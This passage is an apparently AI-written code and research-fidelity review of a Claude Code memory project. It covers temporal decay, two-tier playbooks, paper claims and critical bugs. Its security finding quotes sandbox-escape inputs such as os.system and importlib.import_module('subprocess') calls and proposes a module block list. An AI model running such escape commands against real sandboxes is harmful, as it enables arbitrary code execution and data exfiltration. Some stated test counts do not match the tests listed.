- `TestUpdateCountsWithFailureLessons` (5 tests): harmful without lesson, harmful with lesson, multiple accumulate, helpful ignores, empty ignored
- `TestFailureLessonPersistence` (5 tests): save and load, nonexistent file, corrupt JSON, save empty, roundtrip multiple

Serialization and display:
- `TestSerializeWithFailures` (2 tests): no failures matches serialize, with failures includes lessons
- `TestPlaybookStatsWithFailureLessons` (3 tests): stats count, harmful without lessons, harmful coverage
- `TestPreventionPrinciples` (2 tests): get all, empty

Scope and metadata:
- `TestBulletScopeAndWhenToApply` (6 tests): default scope, default when_to_apply, custom scope, custom when_to_apply, scope preserved through parsing, format_line doesn't include scope
- `TestFailureLessonTaskContext` (7 tests): default empty, set, in to_dict, from_dict, in format_text, absent from format_text, roundtrip

Merge and prune with lessons:
- `TestMergePreservesFailureLessons` (3 tests): merge combines lessons, absorbed removed, prune returns with lessons

Evolution:
- `TestCheckEvolutionNeeded` (4 tests): no harmful, below threshold, meets threshold, stats includes evolution info
- `TestEvolveFromFailures` (10 tests): below threshold returns empty, at threshold creates skills, in heuristics section, scope general, has when_to_apply, uses task_context, content is prevention_principle, unique IDs, zero counts, dedup same principle, skips empty principle, fallback when_to_apply, serialization roundtrip
- `TestPersistScopeAndWhenToApply` (5 tests): scope persists, default not saved, evolved bullets persist, backward compat, mixed bullets
- `TestEvolveDedupsAgainstExisting` (2 tests): existing blocks duplicate, partial dedup
- `TestEvolveIdempotency` (4 tests): double evolve, evolved flag persisted, new lessons after evolution still evolve

**What's missing:**
- No test for the pruning-before-evolution data loss (because it's a real bug)
- No test for cross-failure synthesis (because it's not implemented)
- No test for success skill distillation (because it's not implemented)
- No test verifying dedup catches semantically similar but lexically different principles

---

## Temporal Decay (ACT-R / SYNAPSE inspired) — Score: 7/10

### What They Claim vs What They Built

Temporal decay applies exponential forgetting to playbook bullet scores, inspired by ACT-R's base-level activation decay and SYNAPSE's spreading activation. The implementation:
- `effective_score() = (helpful - harmful) * 0.95^days` where `days = (now - last_updated).days`
- `last_updated` is a datetime string set when counters are updated or on ADD
- `enforce_token_budget` uses `effective_score()` for pruning priority
- Decay rate 0.95/day gives: 30 days = 21.5%, 90 days = 0.99%, 365 days = 0.00005%

### Equation Verification

The `effective_score` method (`playbook.py:148-164`):
```python
def effective_score(self) -> float:
    raw = self.helpful - self.harmful
    if not self.last_updated:
        return float(raw)
    try:
        updated = datetime.fromisoformat(self.last_updated)
        days = (datetime.now() - updated).days
        if days <= 0:
            return float(raw)
        decay = 0.95 ** days
        return raw * decay
    except (ValueError, TypeError):
        return float(raw)
```

- **Decay formula**: `raw * 0.95^days`. This is a discrete exponential decay. ACT-R uses `B_i = ln(sum(t_j^(-d)))` which is a power-law decay (d=0.5), not exponential. The claim of "ACT-R inspired" is directionally correct (both model forgetting over time) but the functional form is different. ACT-R's power law decays much slower initially and faster asymptotically than exponential decay.

- **Decay rate**: 0.95/day is hardcoded. Half-life = ln(2)/ln(1/0.95) = 13.5 days. This means a bullet loses half its effective score in ~2 weeks. This is aggressive -- a strategy that was helpful 3 weeks ago retains only ~35% of its score.

- **Days granularity**: `days = (datetime.now() - updated).days` uses integer days, not fractional. A bullet updated 23 hours ago has `days=0` and no decay. A bullet updated 25 hours ago has `days=1` and 5% decay. This creates a step function rather than smooth decay. Using `total_seconds() / 86400.0` would be smoother.

### Missing/Omitted Components

1. **Configurable decay rate**: Hardcoded 0.95. `ACEConfig` doesn't include a `decay_rate` field. Users cannot tune aggressiveness. The CLAUDE.md's commit C031 even notes "Consider adding decay_rate as a configurable parameter" -- but it wasn't done.

2. **Per-access reinforcement**: ACT-R's base-level activation increases on every retrieval, not just every update. A bullet frequently viewed via `ace_get_playbook` but never voted on will decay continuously. In ACT-R, viewing it would reinforce it. This means useful-but-stable strategies decay into oblivion even if they're read every session.

3. **Separate decay for helpful vs harmful**: The current formula decays `(helpful - harmful)` as a unit. A bullet with helpful=10, harmful=8 (net=2) decays identically to one with helpful=2, harmful=0 (net=2). But the first has much more evidence. A confidence-weighted decay or separate counter decay would be more principled.

4. **SYNAPSE spreading activation**: The claim mentions SYNAPSE but there's no spreading activation -- bullets don't activate related bullets. It's purely individual decay.

### Implementation Bugs Found

1. **Integer days causes step-function behavior**: As described above, `days = (datetime.now() - updated).days` truncates to integer. This means all updates within the same calendar day get identical decay (zero). A bullet updated at 11:59 PM gets zero decay at 12:01 AM the next day, but a bullet updated at 12:01 AM gets zero decay at 11:59 PM the same day (23h58m elapsed, but `days=0`).

2. **Negative effective_score for harmful bullets decays toward zero**: If `raw = helpful - harmful = -3`, then `effective_score = -3 * 0.95^days`. As days increase, the effective score approaches 0 from below. This means harmful bullets become LESS harmful over time, which might be desirable (old mistakes matter less) but should be an explicit design choice, not an accident of the math.

3. **`last_updated` set on ADD but not on MERGE target**: When two bullets merge (`playbook.py:488-493`), the target bullet's counters are summed but `last_updated` is not updated. The merged bullet retains the target's original `last_updated`, which may be old. Since the MERGE indicates recent activity, `last_updated` should be refreshed.

### Test Coverage Assessment

**Good.** 12 tests in `TestTemporalDecay`:
- `test_effective_score_no_timestamp`: No decay when `last_updated` is empty
- `test_effective_score_fresh`: Negligible decay for just-updated bullet
- `test_effective_score_30_days`: ~21.5% retained at 30 days
- `test_effective_score_90_days`: ~1% retained at 90 days
- `test_effective_score_negative`: Negative scores also decay
- `test_update_counters_sets_timestamp`: Counter updates set `last_updated`
- `test_add_sets_timestamp`: ADD operation sets `last_updated`
- `test_enforce_budget_uses_effective_score`: Budget pruning orders by effective_score
- `test_last_updated_persisted`: `last_updated` survives save/load cycle
- `test_effective_score_invalid_timestamp`: Invalid timestamps return raw score
- `test_decayed_bullets_stat`: Stats include count of decayed bullets

Missing: No test for the integer-day step function. No test for merge not updating `last_updated`. No test for the harmful-decaying-toward-zero behavior.

---

## Two-Tier Playbook (Global + Project) — Score: 7/10

### What They Claim vs What They Built

Two separate playbook instances:
- **Global**: `~/.ccr/global_playbook.txt` + `~/.ccr/global_failure_lessons.json` -- universal heuristics across all projects
- **Project**: `.ccr/playbook.txt` + `.ccr/failure_lessons.json` -- project-specific strategies

All 7 ACE MCP tools accept a `scope` parameter: "project" (default) or "global". `ace_get_playbook` always returns both tiers labeled. `ace_find_similar` supports `scope="cross"` for cross-tier deduplication. The session start hook injects both playbooks.

### Implementation Details

**Initialization** (`mcp_server.py:73-78`):
```python
global_ccr = os.path.expanduser("~/.ccr")
os.makedirs(global_ccr, exist_ok=True)
_global_playbook_path = os.path.join(global_ccr, "global_playbook.txt")
_global_failure_lessons_path = os.path.join(global_ccr, "global_failure_lessons.json")
_global_playbook = _load_global_playbook()
```
Global directory is created at startup. Correct.

**Scope resolution** (`mcp_server.py:322-326`):
```python
def _resolve_playbook(scope: str) -> tuple[Playbook, callable]:
    if scope == "global":
        return _ensure_global_playbook(), _save_global_playbook
    return _ensure_playbook(), _save_playbook
```
Clean dispatch. Every tool that accepts `scope` calls this.

**Cross-tier similarity** (`mcp_server.py:454-486`):
Iterates all global bullets against all project bullets, computing combined word Jaccard + trigram Jaccard (same formula as `find_similar_pairs`). Results sorted by similarity, top 10 returned. This allows detecting when a project strategy duplicates a global one.

**Session hook injection** (`on_session_start.py:59-90`):
```python
global_playbook_path = os.path.expanduser("~/.ccr/global_playbook.txt")
```
Both global and project playbooks are read from disk and injected into Claude Code's context via `<ace_playbook>` tags. Correct.

### Missing/Omitted Components

1. **No promotion logic**: There's no mechanism to automatically promote a project bullet to global. A strategy that proves useful (e.g., helpful=5) in a project and is general-purpose should be promotable to global. This would require: detection (high helpful, general scope, content not project-specific), action (copy to global, remove from project), and dedup (check cross-tier similarity first).

2. **No demotion logic**: If a global strategy proves harmful in a specific project, there's no mechanism to demote it to a project-specific override or exclusion.

3. **ID namespace collision**: Both tiers use the same auto-incrementing ID scheme (e.g., `str-00001`). A global bullet and a project bullet can have identical IDs. The `ace_find_similar` cross-tier output labels them `(global)` vs `(project)`, but other tools that accept `bullet_id` (like `ace_update_counters`) would need the caller to also specify `scope`. This is handled (the `scope` parameter directs to the right playbook), but if a user forgets the scope, they'll update the project bullet instead of the global one.

4. **No conflict resolution**: If a global strategy says "Always use pattern X" and a project strategy says "Never use pattern X in this codebase", there's no mechanism to detect or resolve the contradiction. The agent sees both and must figure it out.

5. **Global playbook not version-controlled**: The project `.ccr/` directory has GCC memory management (commits, branches, etc.). The global `~/.ccr/` directory has no such versioning -- it's just flat files. If the global playbook is corrupted, there's no rollback.

### Implementation Bugs Found

1. **`_resolve_playbook` type annotation uses lowercase `callable`** (`mcp_server.py:322`): `tuple[Playbook, callable]`. Should be `tuple[Playbook, Callable[[], None]]` or just `tuple[Playbook, Any]`. Lowercase `callable` is the builtin function, not the typing construct. This works at runtime (Python 3.10+ accepts it in `tuple[]`) but is inconsistent with the typing style used elsewhere in the codebase and will confuse type checkers.

2. **Cross-tier `find_similar` duplicates the similarity computation** (`mcp_server.py:458-477`): The word Jaccard + trigram Jaccard computation is copy-pasted from `Playbook.find_similar_pairs` rather than being factored into a shared function. The `Playbook._char_trigrams` is called as `Playbook._char_trigrams(...)` (static method access), which works but indicates the similarity logic should be extracted.

3. **`ace_get_stats` doesn't label which stats belong to which tier clearly**: (`mcp_server.py:436-440`):
   ```python
   return json.dumps({
       "global": asdict(gpb.get_stats()),
       "project": asdict(ppb.get_stats()),
   }, indent=2)
   ```
   This is actually fine -- the JSON keys clearly label "global" vs "project". No bug here, I withdraw this point.

4. **Session hook reads playbooks from disk independently of MCP server state**: (`on_session_start.py:59-69`): The hook reads `~/.ccr/global_playbook.txt` directly from disk. If the MCP server has in-memory changes that haven't been saved yet, the hook will inject stale data. In practice, saves happen after every mutation (`_save_playbook()` / `_save_global_playbook()`), so this is unlikely to be a real issue.

### Test Coverage Assessment

**Good.** 12 tests in `TestTwoTierPlaybook` (`test_mcp_server.py:672-805`):
- `test_apply_delta_global_scope`: ADD to global playbook via scope="global"
- `test_apply_delta_project_scope_default`: ADD to project playbook via default scope
- `test_get_playbook_shows_both`: Both tiers appear in output with labels
- `test_get_playbook_both_sections_present`: "GLOBAL PLAYBOOK" and "PROJECT PLAYBOOK" headers
- `test_update_counters_global`: Counter updates on global bullets
- `test_stats_both_tiers`: Stats JSON has "global" and "project" keys
- `test_find_similar_with_scope`: Find similar within a single tier
- `test_find_similar_cross_scope`: Cross-tier similarity detection
- `test_prune_with_scope`: Pruning scoped to a specific tier
- `test_global_playbook_persistence`: Global playbook survives save/load via tmp_path
- `test_tiers_are_independent`: Operations on one tier don't affect the other

Missing: No test for ID collision across tiers. No test for the hook injecting stale data. No test for the `~/.ccr/` directory being created with correct permissions.

---

## Overall Verdict

**Would I accept this at NeurIPS? No, but with major revisions it could be a strong systems paper.**

The fundamental problem is one of **claim calibration**. The project claims to implement four research papers. In reality:

- **GCC**: Faithfully implemented (7/10). The A-MAC admission control is genuinely impressive engineering with correct polarity, Algorithm 1 branches, recency modulation, and structural bypass. The gap (fabricated S(m_conflict)) is small and documented.

- **ACE**: Faithfully implemented (8/10). The playbook data structure, delta operations, and pruning logic match the paper closely. The architectural adaptation (Claude Code as Curator/Reflector instead of sub-agents) is a valid and potentially superior design choice.

- **RLM**: Superficially implemented (5/10). In MCP mode, the core contribution of RLM (autonomous LLM-driven code-observe-iterate loop with compaction) is absent. What remains is a REPL with convenience functions. The legacy orchestrator implements the full loop but is unused. The sandbox has a critical security vulnerability.

- **SkillRL**: Partially implemented (6/10). The failure lesson data structure and mechanical evolution are present, but the teacher model M_T, success skill distillation, accuracy-based triggering, and cross-failure synthesis that define the paper are all absent.

**The honest framing would be**: "We faithfully implement GCC memory management with A-MAC admission control and ACE playbook evolution. We draw structural inspiration from RLM's REPL concept (providing a sandboxed REPL to the host model) and SkillRL's failure lesson format (structured failure analysis with threshold-triggered skill generation), adapting both extensively for a no-sub-model MCP architecture."

The current framing overstates adherence to RLM and SkillRL. At NeurIPS, this would draw immediate reviewer criticism for claiming to implement papers whose core algorithmic contributions are absent from the running system.

---

## Critical Issues (Must Fix)

**Ranked by severity:**

1. **CRITICAL SECURITY: REPL sandbox is trivially escapable.** File: `/Users/qbit-glitch/Desktop/coding-projects/powering_claude_with_less_tokens/ccr/rlm/repl.py`, lines 29-31 and 63.
   - `os` is not in `_BLOCKED_MODULES`: `import os; os.system("arbitrary command")` works
   - `socket` not blocked: network exfiltration possible
   - `sys` not blocked: `sys.modules`, `sys.path` manipulation
   - `open` exposed in `_SAFE_BUILTINS`: arbitrary file read/write
   - `importlib` not blocked: can bypass `_safe_import` entirely via `importlib.import_module("subprocess")`
   
   **Fix**: At minimum, add `os`, `sys`, `socket`, `http`, `urllib`, `importlib`, `pathlib`, `glob`, `webbrowser`, `code`, `codeop` to `_BLOCKED_MODULES`. Remove `open` from `_SAFE_BUILTINS` or replace with a restricted version that only allows access within the temp directory. Consider using a proper sandbox (seccomp, nsjail, or at least `RestrictedPython`).

2. **OTA ID overflow after 999 entries.** File: `/Users/qbit-glitch/Desktop/coding-projects/powering_claude_with_less_tokens/ccr/core/memory.py`, lines 1077-1081.
   - Regex `\[OTA-(\d{3})\]` won't match 4+ digit IDs
   - Counter resets to OTA-001, creating duplicates
   - **Fix**: Change regex to `\[OTA-(\d+)\]` and keep the `03d` format (it already handles >999 correctly on the formatting side since Python's `f"OTA-{1000:03d}"` produces `"OTA-1000"`).

3. **Failure lessons permanently lost on pruning.** File: `/Users/qbit-glitch/Desktop/coding-projects/powering_claude_with_less_tokens/ccr/ace/playbook.py`, line 551-569.
   - `prune_problematic` removes harmful bullets (the ones most likely to have failure lessons)
   - `ace_prune` MCP tool doesn't call `evolve_from_failures` first
   - Pruned bullets' lessons are returned but never saved
   - **Fix**: Either (a) auto-call `evolve_from_failures` before `prune_problematic` in `ace_prune`, or (b) extract and persist failure lessons from pruned bullets into a separate archive before removing them.

4. **S(m_conflict) uses fabricated novelty instead of stored scores.** File: `/Users/qbit-glitch/Desktop/coding-projects/powering_claude_with_less_tokens/ccr/core/memory.py`, lines 633-642.
   - Algorithm 1 line 6 comparison uses `assumed_novelty = 0.7 * conflict_recency` instead of the actual S(m) that was computed when the conflicting commit was created
   - **Fix**: Store the admission score S(m) in the commit record (e.g., as a `**Score**: 0.73` field in commits.md). Parse it in `_parse_recent_commit_data`. Use the real stored score for Algorithm 1 line 6 comparison.

5. **No timezone awareness in timestamps.** File: `/Users/qbit-glitch/Desktop/coding-projects/powering_claude_with_less_tokens/ccr/core/memory.py`, throughout.
   - `datetime.now()` without tzinfo
   - DST transitions, timezone changes cause incorrect recency calculations
   - **Fix**: Use `datetime.now(timezone.utc)` and store UTC timestamps, or use `datetime.now().astimezone()` to include timezone info.

6. **`_merge_into_last_commit` title injection** File: `/Users/qbit-glitch/Desktop/coding-projects/powering_claude_with_less_tokens/ccr/core/memory.py`, line 731.
   - Title interpolated directly into regex replacement string
   - Titles with `\1`, `\n`, etc. will be interpreted as regex sequences
   - **Fix**: Use a lambda replacement function or escape the title.

---

## The Good (Credit Where Due)

1. **A-MAC admission control is genuinely impressive.** The three-way admit/merge/reject with recency-modulated FindConflict, correct polarity throughout (higher score = more valuable, verified by multiple tests), structural bypass for merge/branch types, the 6-type commit classifier with calibrated type priors, and the comprehensive test suite (46+ tests verifying every branch of Algorithm 1) -- this is a thoughtful and careful adaptation of the paper to a no-LLM environment. The decision to fold Recency into similarity modulation rather than the score directly (because R(m)=1.0 for new commits) shows genuine understanding of the algorithm, not just mechanical translation.

2. **ACE playbook is production-quality code.** Clean dataclass model, correct delta operation ordering (ADD before UPDATE before MERGE before REMOVE), failure lesson integration that doesn't break backward compatibility, companion JSON persistence with graceful fallbacks, comprehensive serialization/deserialization with roundtrip fidelity, 120+ tests. The similarity metric (0.4 * word Jaccard + 0.6 * trigram Jaccard) is a reasonable enhancement over pure word Jaccard.

3. **The no-sub-model architectural decision is bold and correct.** Rather than shoehorning a weak local LLM (like GPT-OSS-20B) into roles it can't fill well (Curator, Reflector, Teacher), CCR lets Claude Code itself drive these decisions via MCP tools. Since Claude Code (Claude Opus/Sonnet) is vastly more capable than any locally-hosted model, this produces better outcomes for the user. The MCP tools are designed as pure logic operations (zero LLM calls) that the host model orchestrates -- this is clean, testable, and debuggable.

4. **Thread safety via per-file locks.** The `defaultdict(threading.Lock)` pattern in `MemoryManager` (line 128) is simple and correct for the concurrent access model. Each file gets its own lock, allowing parallel writes to different files while preventing corruption of any single file.

5. **Test suite is substantial and meaningful.** 728 tests total, 5 skipped (real API). Many tests verify actual paper claims rather than just testing plumbing. The admission control tests check Algorithm 1 decision branches. The SkillRL idempotency tests verify that double evolution doesn't create duplicates. The temporal decay tests verify specific decay percentages at 30 and 90 days. The delta operation tests verify ordering constraints. This is a codebase where the tests would actually catch regressions in paper-compliance, not just crashes.

6. **Documentation is honest about limitations.** The CLAUDE.md and code comments explicitly note which paper factors are omitted (U, C), why (no LLM available), and what the impact is. The `compute_admission_score` docstring (memory.py:517-563) is 46 lines of detailed documentation explaining every design decision, factor, and weight rationale. This level of documentation transparency is rare and appreciated.

7. **The SkillRL evolved-flag idempotency mechanism** (`playbook.py:143`, `evolved: bool = False`) is a nice touch. It prevents double-evolution of the same failure lessons even across sessions, which is a subtle correctness requirement that many implementations would miss.

8. **The companion JSON persistence pattern** (separate `failure_lessons.json` alongside `playbook.txt`) is a clean design that keeps the human-readable playbook format intact while storing structured metadata. Backward compatibility is maintained -- old playbooks without companion JSON files load correctly with default values.